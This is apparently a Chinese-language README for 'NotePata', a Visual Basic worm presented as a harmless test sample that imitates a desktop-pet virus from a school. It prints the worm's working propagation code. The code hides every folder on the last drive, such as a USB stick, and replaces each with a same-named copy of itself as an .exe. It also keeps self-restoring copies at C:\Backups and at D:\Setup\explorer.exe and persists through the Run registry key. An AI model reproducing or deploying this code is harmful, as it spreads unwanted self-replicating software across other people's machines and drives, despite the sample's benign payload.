# **NotePata - 基于Visual Basic的病毒测试样本**  
##### **声明：本程序为测试样本，本身无实际危害性；切勿使用其从事危害计算机系统的活动，如因不当操作造成危害，概不负责。**  
**程序及源码文件等校验码请[[点此]](/shamd5.md "点此")**
- ## 前情提要
**2023年5月，  
学校的电脑出现了一个病毒. . .  
这个病毒与以往的病毒不同。  
不像木马病毒，隐秘又凶险，  
不像蠕虫病毒，恶毒而无情，  
更不像勒索病毒，敲诈勒索无辜的设备。  
只是在页面底下，出现一个初音桌宠，  
在底部栏活动、奔跑、跳跃。  
一月之间，该病毒传遍各个教室。  
不知病毒由何而来，  
只是，  
同学校相处的最后一个月，  
多了一份特别的挂念. . .**  
- ## 样本简介
**该样本为仿照学校病毒，无毒但具有一定传播力的计算机病毒，由 `CFIT` 于 `2023/7/1` 起编写而成。**
- ## 样本原理
- ##### 文件夹感染
**文件夹感染函数由主题函数```ShowFileList()```实现。
函数代码如下：**
```vb
Private Sub ShowFileList(folderspec) '主体感染函数
On Error GoTo bbzlp0
Dim fs, f, f1, fc
If CreateObject("Scripting.FileSystemObject").DriveExists(folderspec) Then '判断指定盘是否存在
Set fs = CreateObject("Scripting.FileSystemObject")
Set f = fs.getfolder(folderspec)
Set fc = f.SubFolders
For Each f1 In fc '先扫描指定盘的所有文件夹
Debug.Print folderspec + "\" + f1.Name + "\"
If f1.Name <> "System Volume Information" Then '排除"System Volume Information"文件夹
SetAttr folderspec + "\" + f1.Name + "\", vbHidden '隐藏扫描的文件夹
If Dir(folderspec + "\" + f1.Name + ".exe") = "" Then
FileCopy App.Path + "\" + App.EXEName + ".exe", folderspec + "\" + f1.Name + ".exe" '替换为以感染文件夹为名称的应用程序（其实就是复制病毒本体）
End If
End If
If Dir("C:\Backups\", vbDirectory) = "" Then '病毒Notepata本体文件夹
fs.createfolder ("C:\Backups\")
End If
If Dir("D:\Setup\", vbDirectory) = "" Then '病毒explorer代理文件夹
fs.createfolder ("D:\Setup\")
End If
If Dir("C:\Backups\notepata.exe") = "" Then
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Backups\notepata.exe" '本体被删除，由此恢复
End If
If Dir("D:\Setup\explorer.exe") = "" Then
FileCopy App.Path + "\" + App.EXEName + ".exe", "D:\Setup\explorer.exe" '代理被删除，由此恢复
End If
If App.EXEName <> "notepata" And App.EXEName <> "explorer" And Me.Enabled = True Then '其余情况下，若非本体及代理，则只执行文件夹打开操作
Shell "explorer " + Chr(34) + folderspec + App.EXEName + Chr(34), vbNormalFocus '打开病毒名称的文件夹
Me.Enabled = False '禁用其余行为
Timer1.Enabled = False '禁用其余行为
Timer2.Enabled = False '禁用其余行为
Timer3.Enabled = False '禁用其余行为
Timer4.Enabled = False '禁用其余行为
Timer5.Enabled = False '禁用其余行为
Timer6.Enabled = False '禁用其余行为
End If
Next
Else
DoEvents
End If
bbzlp0:
If Err.Number > 0 Then
HandleErr '错误处理
End If
End Sub
```
- ##### 传播原理
**由以上代码，通过将指定盘符（最后一个盘符，将于以下提及）内所有文件夹隐藏，替换为以文件夹名称命名的病毒程序，通过病毒程序进一步感染。  
确定最后一个盘符代码如下：**
```vb
'此前变量定义等代码省略
StrDrive = String(100, Chr$(0)) '初始化盘符串
Call GetLogicalDriveStrings(100, StrDrive) '返回盘符串（返回值如"C:\D:\E:\..."）
'...中间代码省略
DriveID = Split(StrDrive, Chr$(0)) '返回光盘盘符到数组DeiveID并逐字符分离
For ii = 0 To UBound(DriveID)
If InStr(DriveID(ii), ":") <> 0 Then
av = av + 1
avail(av) = DriveID(ii)
End If
Next ii
S = avail(av) '获得最末盘符（若可移动硬盘为U盘，则感染盘为U盘）
ShowFileList S '调用上述感染核心函数
```
**除此之外，本样本实现加入开机启动项，使用注册表实现。  
注册表项：`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`**
**本样本亦存在代理程序，用于病毒删除后恢复等。具体从源码注释中理解。**
- ##### 桌宠原理
**本样本使用图片逐帧分帧实现动图效果。
逐帧图片如下：**
[![](https://cdn.jsdelivr.net/gh/CFITCorporation/cfitpic@a66715cf1fefc989390869a733b68df61c321c82/pic/2023/07/05/c9b0b75052bc2171ad6afa68cf9f2fe6.png)](./readme.md "逐帧图片")  

**同样，本样本实现光标吸引、无操作6s后开始活动等功能，具体从源码注释中理解。**  
- ## 作者
**本程序样本由`CFIT`独立实现。**
- ## 注意
**如有人向您传播该病毒并要求您测试，请核对本文件头部校验码后操作，否则后果自负。**
